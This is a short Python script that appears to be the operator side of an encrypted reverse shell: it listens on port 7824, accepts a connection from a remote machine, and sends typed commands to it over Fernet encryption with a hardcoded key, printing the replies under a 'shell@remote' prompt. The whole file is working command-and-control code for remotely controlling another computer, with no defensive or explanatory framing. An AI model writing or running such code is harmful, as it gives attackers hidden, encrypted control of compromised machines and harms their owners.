import socket
import os
import sys
from cryptography.fernet import Fernet
import base64

#key = input("whats the encryption key for the client-server connection\n\n key:")
k1 = '5fpjL0m17ZbA-f7mHihDYhtjrJ31oUaivx104iWp2is='
key = k1.encode('utf-8')
fnet = Fernet(key)
host = '0.0.0.0'
port = 7824


def crypt(msg,arg1):
	if arg1 == "e":
		m1 = msg.encode('utf-8')
		m2 = base64.b64encode(m1)
		m3 = fnet.encrypt(m2)
		return m3
	else:
		m1 = fnet.decrypt(msg)
		m2 = base64.b64decode(m1)
		m3 = m2.decode()
		return m3

global s
s = socket.socket() 
s.bind((host,port))

s.listen(5)
c,addr = s.accept()

cwd = "?"

while True:
	c.send(crypt("getcwd","e"))
	cwd = crypt(c.recv(512),"d")
	cmd = input("\033[31mshell@remote\033[0m:\033[34m{}\033[0m#\033[0m ".format(cwd))
	if cmd == "exit":
		c.send(crypt("quit","e"))
		print("Closing connection ...")
		break
	c.send(crypt(cmd,"e"))
	print(crypt(c.recv(40960),"d"))
s.close()
